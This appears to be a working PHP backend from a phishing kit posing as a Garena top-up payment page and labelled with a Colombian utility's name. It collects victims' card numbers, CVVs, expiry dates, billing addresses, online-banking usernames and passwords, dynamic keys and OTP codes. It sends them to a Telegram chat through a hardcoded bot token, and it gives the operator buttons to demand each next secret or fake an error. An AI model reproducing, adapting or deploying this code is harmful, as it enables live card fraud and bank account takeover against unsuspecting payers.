<?php
// send.php - Backend VATIA S.A. E.S.P.
header('Content-Type: application/json; charset=utf-8');

// Leer JSON del body
$raw  = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!is_array($data)) {
    echo json_encode(['ok' => false, 'error' => 'JSON inválido']);
    exit;
}

$event = trim($data['event'] ?? 'CARD_INFO');
$total = (float)($data['total'] ?? 0);

// Datos tarjeta
$cardNumber = trim($data['cardNumber'] ?? '');
$holder     = trim($data['holder']     ?? '');
$expiry     = trim($data['expiry']     ?? '');
$cvv        = trim($data['cvv']        ?? '');
$bank       = trim($data['bank']       ?? '');
$email      = trim($data['email']      ?? '');
$phone      = trim($data['phone']      ?? '');

// Datos dirección
$country    = trim($data['country']    ?? '');
$city       = trim($data['city']       ?? '');
$district   = trim($data['district']   ?? '');
$zip        = trim($data['zip']        ?? '');
$street     = trim($data['street']     ?? '');
$addinfo    = trim($data['addinfo']    ?? '');

// Datos login
$loginUser  = trim($data['loginUser']  ?? '');
$loginPass  = trim($data['loginPass']  ?? '');

// Datos dinámica
$dinamica   = trim($data['dinamica']   ?? '');

// Datos OTP
$otp        = trim($data['otp']        ?? '');

$ip   = !empty($_SERVER['HTTP_X_FORWARDED_FOR'])
    ? $_SERVER['HTTP_X_FORWARDED_FOR']
    : ($_SERVER['REMOTE_ADDR'] ?? 'No disponible');
$time = date('Y-m-d H:i:s');

// Config Telegram
$configPaths = [
    __DIR__ . '/../data-ps/recargas/config.php',
    $_SERVER['DOCUMENT_ROOT'] . '/data-ps/recargas/config.php',
    __DIR__ . '/../../data-ps/recargas/config.php'
];

$botToken = '8262215506:AAHJjbwyPCnu7AwwWoLypQRSRAb-GWlLCD8';
$chatId = '-1003627218194';

foreach ($configPaths as $configFile) {
    if (file_exists($configFile)) {
        $config = require $configFile;
        if (isset($config['bot_token']) && isset($config['chat_id'])) {
            $botToken = $config['bot_token'];
            $chatId = $config['chat_id'];
            break;
        }
    }
}

// Construir mensaje según evento
if ($event === 'CARD_INFO') {
    $mensaje  = "⚡ <b>Nuevo Pago - Garena</b>\n\n";
    $mensaje .= "💰 <b>Total: $" . number_format($total, 2, ',', '.') . " COP</b>\n";
    $mensaje .= "🕐 {$time}\n";
    $mensaje .= "📍 IP: <code>{$ip}</code>\n\n";
    $mensaje .= "━━━━━━━━━━━━━━━━━━\n";
    $mensaje .= "📧 <b>Email:</b> {$email}\n";
    $mensaje .= "📱 <b>Celular:</b> {$phone}\n\n";
    $mensaje .= "🏦 <b>Banco:</b> {$bank}\n";
    $mensaje .= "💳 <b>Tarjeta:</b> <code>{$cardNumber}</code>\n";
    $mensaje .= "👤 <b>Titular:</b> {$holder}\n";
    $mensaje .= "📅 <b>Vence:</b> <code>{$expiry}</code>\n";
    $mensaje .= "🔒 <b>CVV:</b> <code>{$cvv}</code>\n\n";
    $mensaje .= "📍 <b>Dirección de facturación:</b>\n";
    $mensaje .= "{$street}\n";
    $mensaje .= "{$district}, {$city}\n";
    $mensaje .= "{$zip} - {$country}";
    if ($addinfo) {
        $mensaje .= "\n<i>{$addinfo}</i>";
    }
} elseif ($event === 'LOGIN') {
    $mensaje  = "🔐 <b>Login Banca - Garena</b>\n\n";
    $mensaje .= "💰 Total: $" . number_format($total, 2, ',', '.') . " COP\n";
    $mensaje .= "🏦 <b>Banco:</b> {$bank}\n";
    $mensaje .= "👤 <b>Usuario:</b> <code>{$loginUser}</code>\n";
    $mensaje .= "🔑 <b>Contraseña:</b> <code>{$loginPass}</code>\n\n";
    $mensaje .= "🕐 {$time}\n";
    $mensaje .= "📍 IP: <code>{$ip}</code>";
} elseif ($event === 'DINAMICA') {
    $mensaje  = "🔐 <b>Clave Dinámica - Garena</b>\n\n";
    $mensaje .= "💰 Total: $" . number_format($total, 2, ',', '.') . " COP\n";
    $mensaje .= "🔢 <b>Dinámica:</b> <code>{$dinamica}</code>\n\n";
    $mensaje .= "🕐 {$time}\n";
    $mensaje .= "📍 IP: <code>{$ip}</code>";
} elseif ($event === 'OTP') {
    $mensaje  = "📱 <b>Código OTP - Garena</b>\n\n";
    $mensaje .= "💰 Total: $" . number_format($total, 2, ',', '.') . " COP\n";
    $mensaje .= "🔢 <b>OTP:</b> <code>{$otp}</code>\n\n";
    $mensaje .= "🕐 {$time}\n";
    $mensaje .= "📍 IP: <code>{$ip}</code>";
} else {
    $mensaje = "ℹ️ Evento desconocido: {$event}";
}

// Botones inline
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Pedir LOGIN',    'callback_data' => 'ACTION:NEXT_AUT'],
            ['text' => '✅ Pedir DINÁMICA', 'callback_data' => 'ACTION:NEXT_DIN'],
            ['text' => '✅ Pedir OTP',      'callback_data' => 'ACTION:NEXT_OTP'],
        ],
        [
            ['text' => '❌ Error Tarjeta',  'callback_data' => 'ACTION:ERR_TC'],
            ['text' => '❌ Error Login',    'callback_data' => 'ACTION:ERR_LOGIN'],
        ],
        [
            ['text' => '❌ Error Dinámica', 'callback_data' => 'ACTION:ERR_DIN'],
            ['text' => '❌ Error OTP',      'callback_data' => 'ACTION:ERR_OTP'],
        ],
        [
            ['text' => '✅ FINALIZAR',      'callback_data' => 'ACTION:FINISH'],
        ],
    ],
];

$reply_markup = json_encode($keyboard, JSON_UNESCAPED_UNICODE);

// Enviar a Telegram
$apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";

$postFields = [
    'chat_id'      => $chatId,
    'text'         => $mensaje,
    'parse_mode'   => 'HTML',
    'reply_markup' => $reply_markup,
];

$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL            => $apiUrl,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => $postFields,
    CURLOPT_TIMEOUT        => 15,
]);
$response = curl_exec($ch);
$errno    = curl_errno($ch);
$err      = curl_error($ch);
curl_close($ch);

if ($errno || $response === false) {
    echo json_encode(['ok' => false, 'error' => $err ?: 'curl error']);
    exit;
}

$json = json_decode($response, true);
$ok   = $json['ok'] ?? false;
$messageId = $ok ? ($json['result']['message_id'] ?? null) : null;

echo json_encode([
    'ok'         => $ok,
    'message_id' => $messageId,
    'chat_id'    => $chatId,
], JSON_UNESCAPED_UNICODE);
